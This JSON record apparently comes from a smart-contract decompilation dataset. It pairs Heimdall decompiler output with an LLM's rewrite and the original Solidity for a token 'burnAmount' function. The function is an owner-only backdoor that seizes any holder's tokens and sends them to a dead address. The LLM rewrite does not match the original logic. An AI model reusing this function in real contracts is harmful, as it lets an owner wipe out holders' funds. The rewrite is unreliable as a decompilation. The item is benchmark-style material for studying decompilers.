{
    "contract_address": "0xF47024a2e10D77927767cBE5aADf5F8BB02782c9",
    "heimdall_input": "function burnAmount(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - (address(owner / 0x01)), \"TARGET ERROR\");\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        address var_f = address(arg0);\n        var_h = 0x65;\n        require(storage_map_i[var_f] > (arg1 * 0x0de0b6b3a7640000), \"TARGET ERROR\");\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = address(arg0);\n        var_h = 0x65;\n        require(!(storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000) > storage_map_i[var_f]), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = address(arg0);\n        var_h = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000);\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = 0xdead;\n        var_h = 0x65;\n        require(!(storage_map_i[var_f] > (storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = 0xdead;\n        var_h = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000);\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x0c;\n        var_e = 0x544152474554204552524f520000000000000000000000000000000000000000;\n    }",
    "llm_output": "function burnTokens(address targetAddress, uint256 tokenAmount) public payable {\n    require(targetAddress == address(targetAddress), \"Invalid target address\");\n    require(tokenAmount == tokenAmount, \"Invalid token amount\");\n    require(msg.sender == owner, \"Ownable: caller is not the owner\");\n\n    // Error message constants\n    bytes32 errorMessage = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n    uint256 errorOffset = 0x20;\n    bytes32 ownableError = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n\n    require(targetAddress != owner, \"TARGET ERROR\");\n    require(!(tokenAmount & (0x0de0b6b3a7640000 > (type(uint256).max / tokenAmount))), \"TARGET ERROR\");\n\n    address storageAddress = targetAddress;\n    require(balanceMap[storageAddress] > (tokenAmount * 0x0de0b6b3a7640000), \"TARGET ERROR\");\n    require(!(tokenAmount & (0x0de0b6b3a7640000 > (type(uint256).max / tokenAmount))), \"TARGET ERROR\");\n\n    require(!(balanceMap[storageAddress] - (tokenAmount * 0x0de0b6b3a7640000) > balanceMap[storageAddress]), \"TARGET ERROR\");\n    balanceMap[storageAddress] -= (tokenAmount * 0x0de0b6b3a7640000);\n\n    address deadAddress = 0xdead;\n    require(!(balanceMap[deadAddress] > (balanceMap[deadAddress] + (tokenAmount * 0x0de0b6b3a7640000))), \"TARGET ERROR\");\n    balanceMap[deadAddress] += (tokenAmount * 0x0de0b6b3a7640000);\n}",
    "ground_truth": "function burnAmount(address wallet, uint256 amount) public onlyOwner {\\r\\n        require(wallet != owner(), \\\"TARGET ERROR\\\");\\r\\n        address deadAddress = 0x000000000000000000000000000000000000dEaD;\\r\\n        if (_balances[wallet] <= amount * 10 ** 18) {\\r\\n            _balances[wallet] = 0;\\r\\n            _balances[deadAddress] = _balances[deadAddress] + _balances[wallet];\\r\\n        } else {\\r\\n            _balances[wallet] = _balances[wallet] - amount * 10 ** 18;\\r\\n            _balances[deadAddress] = _balances[deadAddress] + amount * 10 ** 18;\\r\\n        }\\r\\n    }"
}